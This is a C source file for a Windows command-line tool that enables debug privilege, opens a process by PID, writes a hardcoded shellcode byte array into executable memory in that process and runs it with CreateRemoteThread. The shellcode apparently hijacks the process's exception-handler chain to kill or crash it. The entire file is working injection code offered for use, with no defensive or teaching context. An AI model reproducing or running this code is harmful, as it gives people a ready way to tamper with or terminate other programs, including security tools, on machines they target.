//=================================================================
// 1. Enable the DebugPrivilege
// 2. OpenProcess(...) with the target PID
// 3. CreateRemoteThread(..) inject the target process
// 4. Done! gl

// For more information, see 
// http://hi.baidu.com/combojiang/blog/item/6aad7def6fc69d10fcfa3c2b.html
//=================================================================

#include <windows.h>
#include <tchar.h>

BOOL EnableDebugPrivilege();
BOOL InjectTarget(IN DWORD PID);
VOID Usage(IN LPCTSTR lpAppName);

int _tmain(int argc,TCHAR **argv)
{
	TCHAR *pEndPtr = NULL;

    if(argc == 2)
	{
		if(!EnableDebugPrivilege())
		{
			_tprintf(TEXT("Failed to enable debug privilege.\n"));
			exit(EXIT_FAILURE);
		}

		if(!InjectTarget(_tcstoul(argv[1],&pEndPtr,10)))
		{
			_tprintf(TEXT("Failed to create the remote thread.\n"));
			exit(EXIT_FAILURE);
		}
		
		_tprintf(TEXT("ENJOY !\n"));
	}
	else
	{
		Usage(argv[0]);	
	}

	return 0;
}

BOOL EnableDebugPrivilege()
{
	BOOL bRet = FALSE;

	HANDLE hToken = NULL;
	LUID Luid;
	TOKEN_PRIVILEGES tp;

	if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
	{
		if(LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&Luid))
		{
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = Luid;
			if(AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL))
				if(GetLastError() != ERROR_NOT_ALL_ASSIGNED)
					bRet = TRUE;
		}
	}

	return bRet;
}

BOOL InjectTarget(IN DWORD PID)
{
	BOOL bRet = FALSE;

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	static BYTE bCode[] = {0x33,0xC9,0x64,0x8B,0x01,0x83,0x38,0xFF,0x74,0x04,0x8B,0x00,0xEB,0xF7,0x8B,0x40,0x08,0x8B,0x40,0x08,0x83,0xC0,0x13,0xFF,0xE0};
	LPVOID lpCode = NULL;

	hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		                   FALSE,PID);
	if(hProcess)
	{
		//VirtualFreeEx(...) is unnecessary 
		lpCode = VirtualAllocEx(hProcess,NULL,sizeof(bCode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		
		if(lpCode)
		{
			WriteProcessMemory(hProcess,lpCode,(LPVOID)bCode,sizeof(bCode),NULL);
			hThread = CreateRemoteThread(hProcess,NULL,0,LPTHREAD_START_ROUTINE(lpCode),NULL,0,NULL);
			if(hThread)
			{
				CloseHandle(hProcess);
				CloseHandle(hThread);

				bRet = TRUE;
			}
		}
	}

	return bRet;
}

VOID Usage(IN LPCTSTR lpAppName)
{
	_tprintf(TEXT("%s\tCopyright (C) Whislter 2007-2008\n")
		    TEXT("Usage: %s Pid\n"),lpAppName,lpAppName);

}



			

